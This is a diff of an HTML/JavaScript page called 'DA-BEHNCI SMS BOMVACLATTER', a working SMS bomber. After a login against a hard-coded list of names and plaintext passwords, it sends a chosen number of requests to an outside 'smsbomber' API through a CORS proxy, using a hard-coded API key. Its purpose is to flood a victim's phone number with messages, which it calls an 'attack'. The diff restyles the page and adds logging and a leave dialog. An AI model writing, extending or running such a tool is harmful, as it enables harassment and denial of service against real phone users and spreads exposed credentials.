@@ -1,55 +1,59 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>DA-BEHNCI SMS BOMVACLATTER</title>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #020d1b;
-      color: #b3e5fc;
+      background-color: #1a1a1a;
+      color: #ffffff;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       flex-direction: column;
+      overflow: hidden;
     }
     .card {
-      background: #03182f;
-      padding: 30px;
+      background: #2c2c2c;
+      padding: 20px;
       border-radius: 12px;
-      box-shadow: 0 0 20px #00bfff;
+      box-shadow: 0 0 20px #d000ff;
       text-align: center;
-      width: 380px;
+      width: 90%;
+      max-width: 400px;
       margin-bottom: 20px;
-      position: relative;
     }
     input {
       display: block;
       margin: 12px auto;
       padding: 12px;
       width: 90%;
-      background: #062a4e;
-      border: 1px solid #00bfff;
+      background: #3d3d3d;
+      border: 1px solid #d000ff;
       border-radius: 6px;
-      color: #b3e5fc;
+      color: #ffffff;
       font-size: 16px;
       font-weight: bold;
     }
     button {
-      padding: 10px 25px;
-      background: #00bfff;
+      padding: 10px 20px;
+      background: #d000ff;
       border: none;
-      color: #03182f;
+      color: #ffffff;
       font-weight: bold;
       border-radius: 6px;
       cursor: pointer;
       font-size: 16px;
       margin-top: 10px;
+      width: 90%;
+      box-shadow: 0 0 10px #d000ff;
     }
     button:hover {
-      background: #00a3cc;
+      background: #9d00c6;
     }
     .log {
       margin-top: 20px;
@@ -60,19 +64,19 @@
       padding: 10px;
       text-align: left;
       font-size: 14px;
-      border: 1px solid #00bfff;
+      border: 1px solid #d000ff;
     }
     .log-entry {
       margin: 4px 0;
       font-family: monospace;
-      color: #00ffcc;
+      color: #b76aff;
       font-weight: bold;
     }
     .certified-link {
       position: absolute;
       bottom: 12px;
       right: 14px;
-      color: #00bfff;
+      color: #d000ff;
       cursor: pointer;
       font-size: 13px;
       text-decoration: underline;
@@ -81,7 +85,7 @@
     .timer {
       margin-top: 10px;
       font-size: 15px;
-      color: #00bfff;
+      color: #d000ff;
       font-weight: bold;
     }
     h1, h2 {
@@ -91,8 +95,49 @@
     #loginMessage {
       margin-top: 10px;
       font-size: 13px;
-      color: red;
+      color: #ff66ff;
       font-weight: bold;
+    }
+    .admin-buttons {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      overflow: auto;
+      background-color: rgba(0, 0, 0, 0.7);
+      padding-top: 60px;
+    }
+    .modal-content {
+      background-color: #2c2c2c;
+      margin: 5% auto;
+      padding: 20px;
+      border: 1px solid #d000ff;
+      width: 80%;
+      max-width: 300px;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .modal-button {
+      background: #d000ff;
+      border: none;
+      color: white;
+      padding: 10px 20px;
+      margin: 5px;
+      border-radius: 5px;
+      cursor: pointer;
+      box-shadow: 0 0 10px #d000ff;
+    }
+    .modal-button:hover {
+      background: #9d00c6;
     }
   </style>
 </head>
@@ -102,21 +147,35 @@
     <input type="text" id="username" placeholder="👤 Name" />
     <div style="position: relative;">
       <input type="password" id="password" placeholder="🔒 Password" />
-      <span onclick="togglePassword()" style="position: absolute; right: 25px; top: 14px; cursor: pointer; color: #00bfff;">👁️</span>
+      <span onclick="togglePassword()" style="position: absolute; right: 25px; top: 14px; cursor: pointer; color: #d000ff;">👁️</span>
     </div>
     <button onclick="login()">Login</button>
     <div id="loginMessage" class="log-entry"></div>
     <div class="certified-link" onclick="showValidUsers()">🔎 Valid Users</div>
   </div>
+
   <div id="main-section" class="card" style="display: none;">
     <h1>DA-BEHNCI SMS BOMVACLATTER</h1>
     <input id="number" placeholder="📱 Phone Number" />
     <input id="count" type="number" placeholder="🔁 How many messages?" />
     <input id="delay" type="number" placeholder="⏱️ Delay (seconds)" />
-    <button onclick="startSimulation()">START</button>
+    <div class="admin-buttons">
+      <button onclick="startSimulation()">START</button>
+      <button onclick="saveLogs()" style="display: none;" id="saveLogsButton">Save Logs</button>
+    </div>
     <div class="timer" id="timerDisplay"></div>
     <div class="log" id="logBox"></div>
   </div>
+
+  <!-- Modal -->
+  <div id="leaveModal" class="modal">
+    <div class="modal-content">
+      <h3>Do you want to leave?</h3>
+      <button class="modal-button" id="leaveButton">Leave</button>
+      <button class="modal-button" id="continueButton">Continue</button>
+    </div>
+  </div>
+
   <script>
     const certifiedUsers = [
       { name: "Admin", pass: "Bomva" },
@@ -147,11 +206,12 @@
       { name: "Jewel", pass: "Jew601" }
     ];
 
-    let currentUser        = "";
+    let currentUser = "";
     let cooldownActive = false;
     let cooldownTimer;
-    let remainingCooldownTime = 0; // Store remaining cooldown time
-    let isAttacking = false; // Track if an attack is in progress
+    let remainingCooldownTime = 0;
+    let isAttacking = false;
+    let logs = [];
 
     function togglePassword() {
       const pw = document.getElementById("password");
@@ -172,25 +232,25 @@
         return;
       }
 
-      loginMessage.textContent = ""; // clear error
-      currentUser        = found.name;
+      loginMessage.textContent = "";
+      currentUser = found.name;
       document.getElementById("login-section").style.display = "none";
       document.getElementById("main-section").style.display = "block";
+      logAction(`${currentUser} logged in.`);
 
-      // Check if cooldown is active and user is not Admin
-      if (cooldownActive && currentUser  !== "Admin") {
+      if (cooldownActive && currentUser !== "Admin") {
         displayCooldownMessage();
+      }
+
+      if (currentUser === "Admin") {
+        document.getElementById("saveLogsButton").style.display = "block";
       }
     }
 
     function showValidUsers() {
       const visibleUsers = certifiedUsers.filter(u => u.name !== "Admin").map(u => u.name);
-
       const existing = document.getElementById("validUsersPopup");
-      if (existing) {
-        existing.remove(); // if already open, remove it
-        return;            // toggle behavior
-      }
+      if (existing) return existing.remove();
 
       const popup = document.createElement("div");
       popup.id = "validUsersPopup";
@@ -198,12 +258,12 @@
         position: "fixed",
         top: "20px",
         right: "20px",
-        background: "#03182f",
-        color: "#00bfff",
+        background: "#2c2c2c",
+        color: "#d000ff",
         padding: "15px",
         borderRadius: "10px",
-        border: "1px solid #00bfff",
-        boxShadow: "0 0 10px #00bfff",
+        border: "1px solid #d000ff",
+        boxShadow: "0 0 10px #d000ff",
         maxHeight: "300px",
         overflowY: "auto",
         zIndex: "9999",
@@ -218,7 +278,7 @@
         right: "10px",
         cursor: "pointer",
         fontWeight: "bold",
-        color: "#ff6666"
+        color: "#ff66ff"
       });
       closeBtn.onclick = () => popup.remove();
 
@@ -229,7 +289,6 @@
 
       popup.appendChild(closeBtn);
       popup.appendChild(title);
-
       visibleUsers.forEach(user => {
         const userLine = document.createElement("div");
         userLine.textContent = "• " + user;
@@ -239,44 +298,19 @@
       document.body.appendChild(popup);
     }
 
-    function displayCooldownMessage() {
-      const logBox = document.getElementById("logBox");
-      const cooldownDisplay = document.createElement("div");
-      cooldownDisplay.className = "log-entry";
-      cooldownDisplay.style.color = "orange";
-      cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
-      logBox.appendChild(cooldownDisplay);
-      logBox.scrollTop = logBox.scrollHeight;
-
-      // Start countdown if not already started
-      if (remainingCooldownTime > 0) {
-        cooldownTimer = setInterval(() => {
-          remainingCooldownTime--;
-          cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
-          if (remainingCooldownTime <= 0) {
-            clearInterval(cooldownTimer);
-            cooldownActive = false;
-            cooldownDisplay.textContent = "Cooldown finished. You can send messages now.";
-          }
-        }, 1000); // Update every second
-      }
-    }
-
     function startSimulation() {
       let number = document.getElementById("number").value.trim();
       const count = parseInt(document.getElementById("count").value.trim());
       const delay = parseFloat(document.getElementById("delay").value.trim()) || 1.5;
       const logBox = document.getElementById("logBox");
       const timerDisplay = document.getElementById("timerDisplay");
-      const api_key = "b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8"; // Use a secure method to store this
 
       if (number.length === 10 && number.startsWith("9")) {
         number = "0" + number;
         document.getElementById("number").value = number;
       }
 
-      const isValidNumber = /^09\d{9}$/.test(number);
-      if (!isValidNumber || isNaN(count) || count <= 0 || isNaN(delay)) {
+      if (!/^09\d{9}$/.test(number) || isNaN(count) || count <= 0 || isNaN(delay)) {
         logBox.innerHTML = "<div class='log-entry' style='color: orange;'>⚠️ Invalid phone number, count, or delay.</div>";
         return;
       }
@@ -288,19 +322,18 @@
 
       logBox.innerHTML = "";
       timerDisplay.textContent = "🚀 Starting Attack...";
-      isAttacking = true; // Set attacking state to true
+      isAttacking = true;
 
       let completed = 0;
 
       for (let i = 1; i <= count; i++) {
         setTimeout(() => {
-          // Check if cooldown is active and user is not Admin
-          if (cooldownActive && currentUser  !== "Admin") {
+          if (cooldownActive && currentUser !== "Admin") {
             logBox.innerHTML += "<div class='log-entry' style='color: orange;'>⚠️ Cooldown active. Please wait.</div>";
             return;
           }
 
-          const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=${api_key}`;
+          const url = `https://corsproxy.io/?https://haji-mix-api.gleeze.com/api/smsbomber?phone=${encodeURIComponent(number)}&amount=1&api_key=b7803e277f88d59c3ee050bd866aa2eeaa1a6100bf60a8bca9474b886fceb9d8`;
 
           fetch(url)
             .then(res => res.json())
@@ -311,17 +344,17 @@
               log.textContent = `${i.toString().padStart(2, '0')} ✅ Sent to ${number}: ${result}`;
               logBox.appendChild(log);
               logBox.scrollTop = logBox.scrollHeight;
+              logAction(`${currentUser} sent ${count} SMS to ${number}.`);
 
               completed++;
               if (completed === count) {
                 timerDisplay.textContent = "✅ Attack Finished.";
-                isAttacking = false; // Reset attacking state
+                isAttacking = false;
               }
 
-              // Activate cooldown after sending a message if user is not Admin
-              if (currentUser  !== "Admin") {
+              if (currentUser !== "Admin") {
                 cooldownActive = true;
-                remainingCooldownTime = 180; // 3 minutes in seconds
+                remainingCooldownTime = 180;
                 displayCooldownMessage();
               }
             })
@@ -336,35 +369,77 @@
               completed++;
               if (completed === count) {
                 timerDisplay.textContent = "✅ Attack Finished.";
-                isAttacking = false; // Reset attacking state
+                isAttacking = false;
               }
             });
         }, i * delay * 1000);
       }
     }
 
-    // Handle back navigation
-    window.onbeforeunload = function() {
+    function displayCooldownMessage() {
+      const logBox = document.getElementById("logBox");
+      const cooldownDisplay = document.createElement("div");
+      cooldownDisplay.className = "log-entry";
+      cooldownDisplay.style.color = "orange";
+      cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
+      logBox.appendChild(cooldownDisplay);
+      logBox.scrollTop = logBox.scrollHeight;
+
+      if (remainingCooldownTime > 0) {
+        cooldownTimer = setInterval(() => {
+          remainingCooldownTime--;
+          cooldownDisplay.textContent = `Cooldown active for ${remainingCooldownTime} seconds.`;
+          if (remainingCooldownTime <= 0) {
+            clearInterval(cooldownTimer);
+            cooldownActive = false;
+            cooldownDisplay.textContent = "Cooldown finished. You can send messages now.";
+          }
+        }, 1000);
+      }
+    }
+
+    function logAction(action) {
+      const now = new Date();
+      const timestamp = now.toLocaleString();
+      logs.push(`${timestamp}: ${action}`);
+    }
+
+    function saveLogs() {
+      const now = new Date();
+      const filename = `${now.getDate()}-${now.getMonth() + 1}-${now.getFullYear()} [${now.getHours()}:${now.getMinutes()}].txt`;
+      const blob = new Blob([logs.join('\n')], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = filename;
+      link.click();
+      logs = [];
+      alert("Logs saved successfully!");
+    }
+
+    window.onbeforeunload = function () {
       if (isAttacking) {
-        return "⚠️ Attack in progress. Leaving will cause the attack to fail. Are you sure you want to leave?";
+        showLeaveModal();
+        return false;
       }
     };
 
-    // Handle back button on main page
-    document.getElementById("main-section").addEventListener("click", function(event) {
+    function showLeaveModal() {
+      const modal = document.getElementById("leaveModal");
+      modal.style.display = "block";
+
+      document.getElementById("leaveButton").onclick = function () {
+        alert("Leaving right now will suspend your account for 1 day. Please contact the admin to unsuspend.");
+        window.location.href = "login.html";
+      };
+
+      document.getElementById("continueButton").onclick = function () {
+        modal.style.display = "none";
+      };
+    }
+
+    document.getElementById("main-section").addEventListener("click", function (event) {
       if (event.target === this) {
-        if (isAttacking) {
-          const confirmLeave = confirm("⚠️ Leaving will cause the attack to fail. Do you want to leave and get suspended for 1 day?");
-          if (confirmLeave) {
-            // Logic to suspend the user can be added here
-            window.location.href = "login.html"; // Redirect to login or another page
-          }
-        } else {
-          const confirmLeave = confirm("Are you sure you want to leave?");
-          if (confirmLeave) {
-            window.location.href = "login.html"; // Redirect to login or another page
-          }
-        }
+        showLeaveModal();
       }
     });
   </script>
